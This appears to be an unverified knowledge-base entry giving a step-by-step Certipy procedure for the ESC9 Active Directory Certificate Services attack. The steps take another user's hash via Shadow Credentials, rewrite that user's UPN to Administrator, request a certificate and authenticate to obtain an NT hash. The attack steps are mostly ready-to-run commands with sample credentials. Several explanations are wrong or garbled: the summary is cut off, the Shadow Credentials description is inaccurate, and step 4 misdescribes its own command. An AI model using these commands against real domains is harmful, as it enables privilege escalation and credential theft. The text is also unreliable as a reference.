---
id: 742dec69-13fb-4662-974b-3992d759c926
name: Active Directory Certificate Services ESC9 Attack
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:06.073671+00:00'
updated_at: '2023-04-10T20:25:46.413730+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Bypass User Account Control|T1088 - Bypass User Account Control]]'
- '[[Credential Dumping|T1003 - Credential Dumping]]'
- '[[Exploitation for Credential Access|T1212 - Exploitation for Credential Access]]'
tags:
- '[[Active Directory Attacks]]'
- '[[Active Directory Certificate Services]]'
- '[[ESC9 - No Security Extension]]'
commands:
- '[[certipy shadow auto]]'
- '[[Create certificate request with Certipy]]'
- '[[Update Certipy Account]]'
- '[[Update Certipy Account]]'
---

# Active Directory Certificate Services ESC9 Attack

## Summary

The Active Directory Certificate Services ESC9 attack involves exploiting a vulnerability in the certificate templates used by the Active Directory Certificate Services. This vulnerability allows an attacker to request a certificate with no security extensions, which can be used to perform certific

## Description

# Description

The Active Directory Certificate Services ESC9 attack involves exploiting a vulnerability in the certificate templates used by the Active Directory Certificate Services. This vulnerability allows an attacker to request a certificate with no security extensions, which can be used to perform certificate authentication with NT hash. This allows the attacker to obtain Jane's hash with shadow credentials and update the user principal name. The attack can be executed by requesting a vulnerable certificate template and updating the Certipy account username and password. This attack can be used to gain access to sensitive information and compromise the security of the entire network.

## Requirements

1. Access to the Active Directory Certificate Services

1. Knowledge of vulnerable certificate templates

1. Access to Certipy account

## Defense

1. Regularly update and patch the Active Directory Certificate Services

1. Implement multi-factor authentication to prevent credential theft

1. Monitor network traffic for suspicious activity and implement intrusion detection systems

## Objectives

1. Obtain Jane's hash with shadow credentials

1. Update user principal name

# Instructions

1. To obtain Jane's hash with Shadow Credentials, run the following command:

`certipy shadow auto -username John@corp.local -p Passw0rd -account Jane`

This command will use the `certipy` tool to retrieve Jane's hash using Shadow Credentials. The `-username` parameter specifies the username of the account with Shadow access, which in this case is `John@corp.local`. The `-p` parameter specifies the password for the Shadow account. The `-account` parameter specifies the name of the account whose hash is being retrieved, which in this case is `Jane`.

**Code**: [[certipy shadow auto -username John@corp.local -p P]]

> Shadow Credentials are a technique used to retrieve password hashes from Active Directory without requiring elevated privileges. This is accomplished by using the `GenericWrite` privilege to modify the `unicodePwd` attribute of the user object in question. This attribute is normally write-only, but with the `GenericWrite` privilege, it can be modified to contain the password hash. Once the hash is obtained, it can be used in various attacks, such as pass-the-hash or password cracking.

**Command** ([[certipy shadow auto]]):

```bash
certipy shadow auto -username John@corp.local -p Passw0rd -account Jane
```

2. To update the userPrincipalName of a user, use the 'certipy account update' command followed by the necessary arguments. In this case, use the '-user' argument to specify the user 'Jane', and the '-upn' argument to set the new userPrincipalName to 'Administrator'. Additionally, provide the '-username' and '-password' arguments to authenticate the user 'John@corp.local' with the password 'Passw0rd'.

**Code**: [[certipy account update -username John@corp.local -]]

> -username: The username of the user to authenticate with.
-password: The password of the user to authenticate with.
-user: The username of the user to update the userPrincipalName for.
-upn: The new userPrincipalName to set for the user. This should not include the domain name (i.e. leave out the '@corp.local' part).

**Command** ([[Update Certipy Account]]):

```bash
certipy account update -username John@corp.local -password Passw0rd -user Jane -upn Administrator
```

3. To request a certificate using the certipy command, run the following command:
certipy req -username <username> -hashes ... -ca <CA_name> -template ESC9
Replace <username> with the account name of the user who needs the certificate. Replace <CA_name> with the name of the Certificate Authority that you want to issue the certificate.

Note: The userPrincipalName in the certificate will be set to Administrator and the issued certificate will contain no "object SID".

**Code**: [[certipy req -username jane@corp.local -hashes ... ]]

> This command is used to request a vulnerable certificate template (ESC9) from a user's account using the certipy command. The certificate will be issued by a specified Certificate Authority (CA) and will have the userPrincipalName in the certificate set to Administrator. The issued certificate will contain no "object SID".

**Command** ([[Create certificate request with Certipy]]):

```bash
certipy req -username jane@corp.local -hashes ... -ca corp-DC-CA -template ESC9
```

4. This command updates the username and password of the Certipy account for the user Jane@corp.local. The -username flag specifies the current username, which is John@corp.local. The -password flag specifies the new password, which is Passw0rd. The -user flag specifies the user whose account is being updated, which is Jane@corp.local.

**Code**: [[certipy account update -username John@corp.local -]]

> This command is useful when a user needs to update their Certipy account credentials. The user can specify their current username and new password, and the command will update their account accordingly. It is important to note that this command requires administrative access to the Certipy account and should only be used by authorized personnel.

**Command** ([[Update Certipy Account]]):

```bash
certipy account update -username John@corp.local -password Passw0rd -user Jane@corp.local
```

5. To authenticate with a certificate and receive the NT hash of a user, use the 'certipy auth' command followed by the path to the PFX file and the domain name. If the domain is not specified in the certificate, add the '-domain' argument followed by the domain name to your command line.

**Code**: [[certipy auth -pfx administrator.pfx -domain corp.l]]

> The 'certipy auth' command is used to authenticate with a certificate and retrieve the NT hash of a user. The '-pfx' argument is used to specify the path to the PFX file containing the certificate. The '-domain' argument is used to specify the domain name if it is not already included in the certificate. This command is useful for situations where you need to authenticate with a certificate instead of a password, such as when using two-factor authentication. The NT hash can be used for further authentication or authorization purposes.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]
- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Bypass User Account Control|T1088 - Bypass User Account Control]]
- [[Credential Dumping|T1003 - Credential Dumping]]
- [[Exploitation for Credential Access|T1212 - Exploitation for Credential Access]]

## Commands Used

- [[certipy shadow auto]]
- [[Create certificate request with Certipy]]
- [[Update Certipy Account]]
- [[Update Certipy Account]]

## Tags

- [[Active Directory Attacks]]
- [[Active Directory Certificate Services]]
- [[ESC9 - No Security Extension]]
